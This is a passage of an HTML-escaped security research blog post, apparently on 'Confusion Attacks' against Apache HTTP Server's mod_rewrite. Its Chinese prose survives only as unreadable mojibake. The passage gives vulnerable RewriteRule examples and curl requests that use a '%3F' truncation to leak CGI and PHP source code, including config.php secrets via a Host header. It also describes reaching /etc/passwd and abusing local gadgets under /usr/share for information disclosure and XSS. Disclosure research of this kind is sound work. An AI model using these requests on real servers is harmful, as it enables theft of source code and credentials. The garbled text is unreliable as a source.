            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prefixed with document_root to %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;go-ahead with %s [OK]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç•¶ç„¶çµ•å¤§éƒ¨åˆ†çš„æƒ…æ³æ˜¯ç›®æ¨™æª”æ¡ˆä¸å­˜åœ¨ï¼Œæ–¼æ˜¯ Httpd æœƒå­˜å–å¸¶æœ‰ DocumentRoot çš„ç‰ˆæœ¬ï¼Œä½†é€™å€‹è¡Œç‚ºå·²ç¶“è®“æˆ‘å€‘èƒ½å¤ ã€Œæ•…æ„çš„ã€å»å­˜å– Web Root ä»¥å¤–çš„è·¯å¾‘ï¼Œ&lt;strong&gt;å¦‚æœä»Šå¤©å¯ä»¥æ§åˆ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; çš„ç›®æ¨™å‰ç¶´é‚£æˆ‘å€‘æ˜¯ä¸æ˜¯å°±èƒ½ç€è¦½ä½œæ¥­ç³»çµ±ä¸Šçš„ä»»æ„æª”æ¡ˆäº†ï¼Ÿ&lt;/strong&gt; é€™ä¹Ÿæ˜¯æˆ‘å€‘ç¬¬äºŒå€‹ Confusion Attack çš„ç²¾ç¥ï¼ å¾ GitHub ä¸­å¯ä»¥æ‰¾åˆ°åƒåƒè¬è¬å€‹æœ‰å•é¡Œçš„å¯«æ³•ï¼Œæœ‰è¶£çš„æ˜¯ç”šè‡³é€£&lt;a href=&quot;https://httpd.apache.org/docs/current/rewrite/remapping.html#rewrite-query&quot;&gt;å®˜æ–¹çš„ç¯„ä¾‹æ–‡ä»¶&lt;/a&gt;éƒ½æ˜¯æ˜“é­å—æ”»æ“Šçš„ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Remove mykey=???&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; &quot;%{QUERY_STRING}&quot; &quot;(.*(?:^|&amp;amp;))mykey=([^&amp;amp;]*)&amp;amp;?(.*)&amp;amp;?$&quot;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; &quot;(.*)&quot; &quot;$1?%1%3&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é™¤æ­¤ä¹‹å¤–é‚„æœ‰å…¶å®ƒäº¦å—å½±éŸ¿çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ä¾‹å¦‚åŸºæ–¼å¿«å–éœ€æ±‚æˆ–æ˜¯å°‡æƒ³å‰¯æª”åéš±è—èµ·ä¾†çš„ URL Masking è¦å‰‡ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/html/(.*)$&quot;  &quot;/$1.html&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ–æ˜¯æƒ³ç¯€çœæµé‡ï¼Œå˜—è©¦ä½¿ç”¨å£“ç¸®ç‰ˆæœ¬çš„éœæ…‹æª”æ¡ˆè¦å‰‡ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^(.*)\.(css|js|ico|svg)&quot; &quot;$1\.$2.gz&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å°‡è€èˆŠçš„ç¶²ç«™è½‰å€åˆ°æ ¹ç›®éŒ„çš„è¦å‰‡ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/oldwebsite/(.*)$&quot;  &quot;/$1&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å°æ‰€æœ‰ CORS çš„é æª¢è«‹æ±‚éƒ½å›å‚³ 200 OK çš„è¦å‰‡ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{REQUEST_METHOD} &lt;span class=&quot;ss&quot;&gt;OPTIONS&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^(.*)$ $1 [R=200,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç†è«–ä¸Šåªè¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; çš„ç›®æ¨™å‰ç¶´å¯æ§ï¼Œæˆ‘å€‘å¯ä»¥ç€è¦½å¹¾ä¹æ•´å€‹æª”æ¡ˆç³»çµ±ï¼Œä½†å¾å‰é¢çš„è¦å‰‡ä¸­ç™¼ç¾é‚„æœ‰ä¸€å€‹é™åˆ¶æˆ‘å€‘å¿…é ˆè·¨éçš„ï¼Œå‰é¢ä¾‹å­ä¸­æ‰€å‡ºç¾çš„å‰¯æª”åå¦‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.html&lt;/code&gt; ä»¥åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gz&lt;/code&gt; çš„å¾Œç¶´éƒ½æ˜¯è®“æˆ‘å€‘æ²’é‚£éº¼åœ°è‡ªç”±çš„ä¸€å€‹é™åˆ¶ â€”â€” æ‰€ä»¥å¯ä»¥ç¹éé€™å€‹é™åˆ¶å—ï¼Ÿ ä¸çŸ¥é“æœ‰æ²’æœ‰äººæƒ³èµ·å‰é¢åœ¨ Filename Confusion ç« ç¯€æ‰€ä»‹ç´¹çš„è·¯å¾‘æˆªæ–·ï¼Œé€éé€™å…©å€‹æ”»æ“Šçš„çµåˆï¼Œæˆ‘å€‘å¯ä»¥è‡ªç”±çš„ç€è¦½ä½œæ¥­ç³»çµ±ä¸Šçš„ä»»æ„æª”æ¡ˆï¼&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹ä¾†çš„ç¯„ä¾‹éƒ½åŸºæ–¼é€™å€‹ä¸å®‰å…¨çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ä¾†åšç¤ºç¯„ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/html/(.*)$&quot;  &quot;/$1.html&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-2-1-server-side-source-code-disclosure&quot;&gt;âš”ï¸ Primitive 2-1. Server-Side Source Code Disclosure&lt;/h4&gt;

&lt;p&gt;é¦–å…ˆä¾†ä»‹ç´¹ DocumentRoot Confusion çš„ç¬¬ä¸€å€‹æ”»æ“Šæ‰‹æ³• â€”â€” &lt;strong&gt;ä»»æ„ä¼ºæœå™¨ç«¯ç¨‹å¼ç¢¼æ´©æ¼&lt;/strong&gt;ï¼&lt;/p&gt;

&lt;p&gt;ç”±æ–¼ Httpd æœƒæ ¹æ“šç•¶å‰ç›®éŒ„æˆ–æ˜¯ç•¶å‰è™›æ“¬ä¸»æ©Ÿè¨­å®šæ±ºå®šæ˜¯å¦ç•¶æˆ Server-Side Script è™•ç†ï¼Œå› æ­¤é€éçµ•å°è·¯å¾‘å»å­˜å–ç›®æ¨™ç¨‹å¼ç¢¼å¯ä»¥æ··æ·† Httpd çš„é‚è¼¯å°è‡´æ´©æ¼åŸæœ¬è©²è¢«ç•¶æˆç¨‹å¼ç¢¼åŸ·è¡Œçš„æª”æ¡ˆå…§å®¹ã€‚&lt;/p&gt;

&lt;h5 id=&quot;ï¸-2-1-1-disclose-cgi-source-code&quot;&gt;âœ”ï¸ 2-1-1. Disclose CGI Source Code&lt;/h5&gt;

&lt;p&gt;é¦–å…ˆæ˜¯æ´©æ¼ä¼ºæœå™¨ç«¯çš„ CGI ç¨‹å¼ç¢¼ï¼Œç”±æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; æ˜¯é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptAlias&lt;/code&gt; å°‡ CGI ç›®éŒ„èˆ‡æ‰€æŒ‡å®šçš„ URL å‰ç¶´ç¶å®šèµ·ä¾†ï¼Œç•¶ä½¿ç”¨çµ•å°è·¯å¾‘ç›´æ¥ç€è¦½ CGI æ™‚ç”±æ–¼ URL å‰ç¶´è®Šäº†ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æ´©æ¼å‡ºæª”æ¡ˆåŸå§‹ç¢¼ã€‚&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/cgi-bin/download.cgi
 &lt;span class=&quot;c&quot;&gt;# the processed result from download.cgi&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
 &lt;span class=&quot;c&quot;&gt;# #!/usr/bin/perl&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# use CGI;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# # the source code of download.cgi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;ï¸-2-1-2-disclose-php-source-code&quot;&gt;âœ”ï¸ 2-1-2. Disclose PHP Source Code&lt;/h5&gt;

&lt;p&gt;æ¥è‘—æ˜¯æ´©æ¼ä¼ºæœå™¨ç«¯çš„ PHP ç¨‹å¼ç¢¼ï¼Œç”±æ–¼ PHP çš„ä½¿ç”¨å ´æ™¯çœ¾å¤šï¼Œè‹¥åªé‡å°ç‰¹å®šç›®éŒ„æˆ–æ˜¯è™›æ“¬ä¸»æ©Ÿå¥—ç”¨ PHP ç’°å¢ƒçš„è©± (å¸¸è¦‹æ–¼ç¶²ç«™ä»£ç®¡æœå‹™)ï¼Œå¯ä»¥é€éæœªå•Ÿç”¨ PHP çš„è™›æ“¬ä¸»æ©Ÿå­˜å– PHP æª”æ¡ˆä»¥æ´©æ¼åŸå§‹ç¢¼ï¼&lt;/p&gt;

&lt;p&gt;ä¾‹å¦‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.local&lt;/code&gt; ä»¥åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static.local&lt;/code&gt; å…©å€‹è™›æ“¬ä¸»æ©Ÿéƒ½è¨—ç®¡åœ¨åŒä¸€å°ä¼ºæœå™¨ä¸Šï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.local&lt;/code&gt; å…è¨±é‹è¡Œ PHP è€Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static.local&lt;/code&gt; å‰‡ç´”ç²¹è² è²¬è™•ç†éœæ…‹æª”æ¡ˆï¼Œå› æ­¤å¯ä»¥é€éä¸‹é¢çš„æ–¹å¼æ´©æ¼å‡º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.php&lt;/code&gt; å…§çš„æ•æ„Ÿè³‡è¨Šï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://www.local/config.php
 &lt;span class=&quot;c&quot;&gt;# the processed result (empty) from config.php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://www.local/var/www.local/config.php%3F &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: static.local&quot;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# the source code of config.php&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-2-2-local-gadgets-manipulation&quot;&gt;âš”ï¸ Primitive 2-2. Local Gadgets Manipulation!&lt;/h4&gt;

&lt;p&gt;æ¥ä¸‹ä¾†æ˜¯æˆ‘å€‘çš„ç¬¬äºŒå€‹æ”»æ“Šæ‰‹æ³• â€”â€” &lt;strong&gt;Local Gadgets Manipulation&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;p&gt;é¦–å…ˆï¼Œåœ¨å‰é¢ä»‹ç´¹åˆ°ã€Œç€è¦½ä½œæ¥­ç³»çµ±ä¸Šçš„ä»»æ„æª”æ¡ˆã€æ™‚ä¸çŸ¥é“ä½ æœ‰æ²’æœ‰å¥½å¥‡ï¼š ã€Œæ¬¸é‚£æ˜¯ä¸æ˜¯ä¸€å€‹ä¸å®‰å…¨çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; å°±å¯ä»¥å­˜å–åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;ï¼Ÿã€ å°çš„ â€”â€” ä½†ä¹Ÿä¸å®Œå…¨å°ã€‚ è›¤ï¼Ÿ&lt;/p&gt;

&lt;p&gt;æŠ€è¡“ä¸Šä¾†èªªç¢ºå¯¦ä¼ºæœå™¨æœƒå»æª¢æŸ¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; æ˜¯å¦å­˜åœ¨ï¼Œä½† Apach HTTP Server å…§å»ºçš„å­˜å–æ§åˆ¶é˜»æ“‹äº†æˆ‘å€‘çš„å­˜å–ï¼Œé€™è£¡æ˜¯ Apache HTTP Server çš„&lt;a href=&quot;https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115&quot;&gt;è¨­å®šæª”æ¨¡æ¿å…§å®¹&lt;/a&gt;ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æœƒè§€å¯Ÿåˆ°é è¨­é˜»æ“‹äº†æ ¹ç›®éŒ„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; çš„ç€è¦½ (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Require all denied&lt;/code&gt;)ï¼Œç„¶è€Œå¯¦éš›ä¸Šé€™å°±æ²’æˆ²äº†å—ï¼Ÿ å¯¦éš›ä¸Šå†è©³ç´°è¿½æŸ¥å„å€‹ Httpd çš„ç™¼è¡Œç‰ˆæœƒç™¼ç¾ &lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165&quot;&gt;Debian/Ubuntu&lt;/a&gt; ä½œæ¥­ç³»çµ±é è¨­å…è¨±äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /usr/share&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; granted
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ‰€ä»¥æˆ‘å€‘çš„ã€Œä»»æ„æª”æ¡ˆå­˜å–ã€ä¼¼ä¹æœ‰é»é‚£éº¼åœ°ä¸ä»»æ„ã€‚ ä¸éæˆ‘å€‘æ‰“ç ´åŸæœ¬åªèƒ½ç€è¦½ DocumentRoot çš„ä¿¡ä»»ç®—æ˜¯è·¨å‡ºå¾ˆå¤§çš„ä¸€æ­¥äº†ã€‚ æ¥ä¸‹ä¾†è¦åšçš„äº‹æƒ…å°±æ˜¯ã€Œå£“æ¦¨ã€é€™å€‹ç›®éŒ„å…§çš„å„ç¨®å¯èƒ½ã€‚ã€€æ‰€æœ‰å¯åˆ©ç”¨çš„è³‡æºã€ç›®éŒ„ä¸­ç¾æœ‰çš„æ•™å­¸ç¯„ä¾‹ã€èªªæ˜æ–‡ä»¶ã€å–®å…ƒæ¸¬è©¦æª”æ¡ˆï¼Œç”šè‡³ä¼ºæœå™¨ä¸Šç¨‹å¼èªè¨€å¦‚ PHPã€Python ç”šè‡³ PHP çš„æ¨¡çµ„éƒ½æœ‰æ©Ÿæœƒæˆç‚ºæˆ‘å€‘æ¿«ç”¨çš„å°è±¡ï¼&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. ç•¶ç„¶ä¸Šé¢åªæ˜¯åŸºæ–¼ Ubuntu/Debian ä½œæ¥­ç³»çµ±ç™¼è¡Œçš„ Httpd ç‰ˆæœ¬è¨­å®šåšè§£é‡‹ï¼Œå¯¦å‹™ä¸Šä¹Ÿæœ‰ç™¼ç¾ä¸€äº›æ‡‰ç”¨è»Ÿé«”ç›´æ¥æŠŠçš„æ ¹ç›®éŒ„çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Require all denied&lt;/code&gt; ç§»é™¤å°è‡´å¯ä»¥ç›´æ¥å­˜å– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-2-2-1-local-gadget-to-information-disclosure&quot;&gt;âœ”ï¸ 2-2-1. Local Gadget to Information Disclosure&lt;/h5&gt;

&lt;p&gt;é¦–å…ˆä¾†å°‹æ‰¾çœ‹çœ‹é€™å€‹ç›®éŒ„ä¸‹æ˜¯å¦å­˜åœ¨é€™ä¸€äº›æª”æ¡ˆæ˜¯å¯ä»¥åˆ©ç”¨çš„ã€‚ é¦–å…ˆæ˜¯ç›®æ¨™ Apache HTTP Server å¦‚æœå®‰è£ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;websocketd&lt;/code&gt; é€™å€‹æœå‹™çš„è©±ï¼Œæœå‹™å¥—ä»¶é è¨­æœƒåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/doc/websocketd/examples/php/&lt;/code&gt; ä¸‹æ”¾ç½®ä¸€å€‹ç¯„ä¾‹ PHP ç¨‹å¼ç¢¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dump-env.php&lt;/code&gt;ï¼Œå¦‚æœç›®æ¨™ä¼ºæœå™¨ä¸Šå­˜åœ¨ PHP ç’°å¢ƒçš„è©±å¯ä»¥ç›´æ¥å­˜å–é€™å€‹ç¯„ä¾‹ç¨‹å¼å»æ´©æ¼æ•æ„Ÿçš„ç’°å¢ƒè®Šæ•¸ã€‚&lt;/p&gt;

&lt;p&gt;å¦å¤–å¦‚æœç›®æ¨™åŒæ™‚å®‰è£å¦‚ Nginx æˆ–æ˜¯ Jetty çš„è©±ï¼Œé›–ç„¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; ç†è«–ä¸Šè©²æ˜¯å¥—ä»¶å®‰è£æ™‚æ‰€å­˜æ”¾çš„å”¯è®€è¤‡æœ¬ï¼Œä½†é€™äº›æœå‹™çš„é è¨­ Web Root å°±åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; ä¸‹ï¼Œå› æ­¤ä¹Ÿèƒ½é€éé€™å€‹æ”»æ“Šæ‰‹æ³•å»æ´©æ¼é€™äº›ç¶²é æ‡‰ç”¨çš„æ•æ„Ÿè³‡è¨Šï¼Œä¾‹å¦‚ Jetty ä¸Šçš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; è¨­å®šç­‰ç­‰ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/nginx/html/&lt;/li&gt;
  &lt;li&gt;/usr/share/jetty9/etc/&lt;/li&gt;
  &lt;li&gt;/usr/share/jetty9/webapps/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€™è£¡ç°¡å–®å±•ç¤ºä¸€å€‹é€éå­˜å– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Davical&lt;/code&gt; å¥—ä»¶æ‰€å­˜åœ¨çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setup.php&lt;/code&gt; å”¯è®€è¤‡æœ¬å»æ´©æ¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt; å…§å®¹ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-2-2-2-local-gadget-to-xss&quot;&gt;âœ”ï¸ 2-2-2. Local Gadget to XSS&lt;/h5&gt;

&lt;p&gt;æ¥è‘—å¦‚ä½•æŠŠé€™å€‹æ”»æ“Šæ‰‹æ³•è½‰åŒ–æˆ XSS å‘¢ï¼Ÿ åœ¨ Ubuntu Desktop ç’°å¢ƒä¸­é è¨­æœƒå®‰è£ LibreOffice é€™å¥—é–‹æºçš„è¾¦å…¬å®¤æ‡‰ç”¨ï¼Œåˆ©ç”¨å…¶ä¸­å¹«åŠ©æ–‡ä»¶çš„èªè¨€åˆ‡æ›åŠŸèƒ½ä¾†å®Œæˆ XSSã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: /usr/share/libreoffice/help/help.html&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// the URL came from LibreOffice help (F1)&lt;/span&gt;
